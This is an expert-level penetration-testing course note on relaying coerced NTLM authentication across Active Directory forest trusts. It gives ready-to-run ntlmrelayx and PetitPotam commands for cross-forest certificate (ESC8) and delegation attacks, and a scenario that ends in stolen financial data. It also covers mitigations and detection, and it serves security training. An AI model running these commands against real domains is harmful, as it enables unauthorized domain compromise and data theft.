---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.14 Relay across Forest Trusts"
---

# 14 - Relay across Forest Trusts

## Introduction to Cross-Forest Relaying

Active Directory environments frequently span multiple forests to accommodate organizational boundaries, mergers, and acquisitions. Trust relationships are established between these forests to allow users in one forest to access resources in another. While these trusts are essential for business operations, they introduce highly complex attack surfaces, particularly regarding NTLM authentication and coercion.

Relaying across forest trusts represents an advanced tier of adversary tradecraft. The core objective is to coerce a highly privileged entity (usually a Domain Controller) in a trusted forest (Forest A) to authenticate to an attacker-controlled machine, and then relay that authentication across the trust boundary into the trusting forest (Forest B) to compromise resources or escalate privileges.

### The Dynamics of Inter-Forest NTLM

When NTLM authentication occurs across a trust, the target server in Forest B cannot validate the NTLM challenge-response directly, as it does not possess the user's password hash from Forest A. Instead, it utilizes **Pass-Through Authentication**. 

The server in Forest B passes the NTLM credentials over a secure channel (Netlogon) back to a Domain Controller in Forest B. This DC recognizes the user belongs to a trusted forest and forwards the request across the trust link to a Domain Controller in Forest A. The DC in Forest A validates the credentials and sends a success/failure message back down the chain.

From an attacker's perspective, this means that as long as a valid trust exists, an NTLM relay attack can traverse forests. The target server in Forest B will blindly accept the relayed NTLM authentication if Forest A's DC validates it.

## ASCII Architecture: Cross-Forest Relay Flow

```text
  Forest A (Trusted)                                     Forest B (Trusting)
  [Compromised/Coerced]                                  [Target Resource]
  
+-------------------+                                  +-------------------+
|                   |  1. Coerce Auth                  |                   |
|       DC-A        | -------------------------------> |   Attacker Node   |
| (Target to coerce)|                                  |   (Relay Server)  |
+-------------------+                                  +-------------------+
                                                                 |
                                                                 | 2. Relay NTLM Auth
                                                                 v
+-------------------+                                  +-------------------+
|                   |  4. Validate Auth via Trust      |                   |
|       DC-A        | <------------------------------- |       DC-B        |
|  (Authentication  |                                  |  (Pass-Through)   |
|   Authority)      | -------------------------------> |                   |
+-------------------+  5. Auth Success                 +-------------------+
                                                                 ^
                                                                 | 3. Forward to Netlogon
                                                                 |
                                                                 |
                                                       +-------------------+
                                                       |                   |
                                                       |   Target Server   |
                                                       |   (e.g., AD CS)   |
                                                       +-------------------+
                                                                 | 6. Grant Access based
                                                                 |    on DC-A's identity
```

## Prerequisites for the Attack

1. **Trust Relationship**: A trust must exist between the forests. The trust must allow NTLM authentication (some highly restrictive environments force Kerberos-only across trusts, though this is rare). The trust direction determines who can access what: if Forest B trusts Forest A, users in A can access B. We need to coerce an identity from the trusted forest (A) and relay it to the trusting forest (B).
2. **Coercion Vector**: The attacker must be able to trigger an authentication from the target in Forest A. Tools like `PetitPotam`, `DFSCoerce`, or `ShadowCoerce` are typically used.
3. **Network Routability**: The attacker machine must be reachable by the coerced machine in Forest A, and the attacker must be able to reach the target server in Forest B.
4. **Target Vulnerability**: The target server in Forest B must be vulnerable to relay (e.g., SMB signing disabled, LDAP signing disabled, or an AD CS HTTP endpoint lacking EPA).

## Attack Scenarios and Execution

### Scenario 1: Relaying DC-A to AD CS in Forest B (Cross-Forest ESC8)

This is one of the most devastating cross-forest attacks. If Forest B has an Active Directory Certificate Services (AD CS) infrastructure configured with Web Enrollment (HTTP) and EPA is disabled, an attacker can relay authentication from a DC in Forest A to obtain a certificate.

**Why is this bad?** If the certificate template allows for Client Authentication, the attacker can use the resulting certificate to authenticate as DC-A within Forest B. Depending on the trust configuration (e.g., SID History, unconstrained delegation), this can lead to total compromise of Forest B.

**Step-by-Step Execution:**

1. **Setup Relay**: The attacker configures `ntlmrelayx` to target the AD CS server in Forest B.
   ```bash
   ntlmrelayx.py -t http://adcs.forestb.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
   ```

2. **Coerce DC-A**: The attacker uses PetitPotam against the Domain Controller in Forest A, forcing it to authenticate to the attacker's IP.
   ```bash
   python3 petitpotam.py attacker_ip dc_a_ip
   ```

3. **Capture and Escalate**: `ntlmrelayx` receives the NTLM auth from DC-A, relays it to AD CS in Forest B. AD CS validates it via pass-through to Forest A, issues the certificate, and the attacker saves the Base64 `.pfx` file.

4. **Utilize Certificate**: The attacker uses `Rubeus` or `Certipy` to request a TGT as DC-A using the forged certificate.

### Scenario 2: Relaying to LDAP for Cross-Forest RBCD

If the attacker has a foothold in Forest B but needs elevated privileges, they can coerce a highly privileged account from Forest A, relay it to an LDAP server in Forest B (assuming LDAP signing is not strictly enforced or can be bypassed via Drop-the-MIC), and execute a Resource-Based Constrained Delegation (RBCD) attack.

1. **Setup Relay**:
   ```bash
   ntlmrelayx.py -t ldap://dc-b.forestb.local --delegate-access -smb2support
   ```
2. **Coerce**: Force a user or computer from Forest A to authenticate to the relay.
3. **Execute**: The relay authenticates to LDAP on DC-B as the Forest A entity. If that entity has write privileges over objects in Forest B (often granted in complex merger scenarios or via misconfigured foreign security principals), `ntlmrelayx` configures RBCD, granting the attacker control over the target object in Forest B.

## Complexities: Trust Key and Authentication Silos

Microsoft has introduced several mechanisms that complicate cross-forest attacks.

- **Authentication Silos**: These can restrict which hosts an identity is allowed to authenticate from, potentially blocking the relay if the attacker's IP is outside the silo.
- **SID Filtering**: When a trust is traversed, Forest B will evaluate the SIDs in the user's token. SID Filtering (enabled by default) strips out highly privileged SIDs (like Enterprise Admins) from the foreign forest to prevent immediate cross-forest takeover. However, if the attacker relays a machine account (DC-A$), they operate as that machine account. If the administrators of Forest B explicitly granted permissions to DC-A$ (or the Domain Computers group of Forest A), the attacker still gains access.
- **Trust Boundaries and NTLM Support**: Some organizations disable NTLM across trusts entirely, forcing Kerberos. Since Kerberos is significantly harder to relay (due to SPN validation), this effectively kills cross-forest NTLM relaying.

## Detection and Mitigation Strategies

### Mitigation

1. **Disable NTLM Across Trusts**: This is the most robust defense. Configure the network security policy `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers` and `Incoming NTLM traffic` to audit and eventually block cross-forest NTLM.
2. **Enforce Strong Protocols**: Ensure all targetable services in the trusting forest (Forest B) require SMB Signing, LDAP Signing, and strict EPA for HTTP services (like AD CS). If the destination cannot accept relayed NTLM, the attack fails regardless of the source.
3. **Restrict Coercion**: Implement RPC filters and patch vulnerabilities that allow for unauthenticated coercion (e.g., PetitPotam, DFSCoerce) on Domain Controllers in all forests.
4. **Audit Cross-Forest Permissions**: Strictly review permissions granted to Foreign Security Principals. Do not grant broad access (like `GenericAll` or membership in local administrators groups) to groups like `Domain Computers` or `Authenticated Users` from a trusted forest.

### Detection

1. **Monitor Cross-Forest NTLM**: Analyze Netlogon logs (`%windir%\debug\netlogon.log`) and Event ID 4624/4625 for NTLM authentications crossing the trust boundary. High volumes of NTLM traffic from a single foreign machine account to a specific internal service (like AD CS) is highly anomalous.
2. **Detect Coercion Mechanics**: Monitor for named pipe connections associated with coercion tools (e.g., `\pipe\lsarpc`, `\pipe\efsrpc`, `\pipe\netdfs`) originating from non-standard administrative workstations.
3. **Analyze Certificate Requests**: In AD CS logs, monitor for certificate requests originating from foreign domain computer accounts. A request from `FORESTA\DC01$` on Forest B's CA is a massive red flag indicating a likely ESC8 relay attack.

## Real-World Attack Scenario

During a simulated advanced persistent threat (APT) campaign, an attacker fully compromised `acquisitions.local` (Forest A), a smaller, less secure domain. Their primary objective was to access highly sensitive financial records stored in `corporate.local` (Forest B). A two-way external trust existed between the two forests to support legacy applications, and NTLM authentication was permitted across the trust boundary.

The attacker identified an Active Directory Certificate Services (AD CS) server (`pki.corporate.local`) in Forest B. Enumeration confirmed that its Web Enrollment HTTP endpoint was active and did not enforce Extended Protection for Authentication (EPA), making it vulnerable to ESC8. 

Operating from a compromised machine in Forest A, the attacker initiated an NTLM relay listener aimed at the AD CS server in Forest B, requesting a certificate via the `Machine` template:
```bash
impacket-ntlmrelayx -t http://pki.corporate.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

Next, the attacker used `PetitPotam.py` to coerce `DC01.acquisitions.local` (the Domain Controller of Forest A) into authenticating to the attacker's relay machine:
```bash
python3 petitpotam.py 10.10.50.5 10.10.50.10
```

`ntlmrelayx` intercepted the authentication and relayed it across the network to the AD CS server in Forest B. Because the two forests trusted each other, the AD CS server passed the NTLM challenge-response to its own Domain Controller, which subsequently verified it with Forest A's Domain Controller. The authentication was validated, and the AD CS server in Forest B issued a client authentication certificate for `DC01.acquisitions.local$`.

The attacker used `Certipy` to leverage the newly minted certificate, requesting a Kerberos TGT. Because the Domain Computers of Forest A had been overly permissioned by the administrators of Forest B to read certain file shares, the attacker used the TGT to map the `\\fs01.corporate.local\finance` share and extract the targeted financial data, seamlessly crossing the forest boundary without requiring credentials from the target domain.

## Chaining Opportunities

- **[[08 - Active Directory Certificate Services (AD CS) Attacks]]**: Cross-forest relaying is the primary method for executing ESC8 across trust boundaries.
- **[[05 - Resource-Based Constrained Delegation (RBCD)]]**: Relaying a trusted entity to execute RBCD against resources in the trusting domain.
- **[[11 - Shadow Credentials - MSDS-KeyCredentialLink]]**: Similar to RBCD, relaying to LDAP across the trust to write a shadow credential to a vulnerable object.

## Related Notes
- [[13 - EPA Extended Protection Bypasses]]
- [[12 - Drop-the-MIC - Bypassing NTLM MIC]]
- [[15 - Coercion and Relay Defense Strategies]]
- [[02 - NTLM Relay Attacks Deep Dive]]
- [[04 - Unconstrained and Constrained Delegation]]
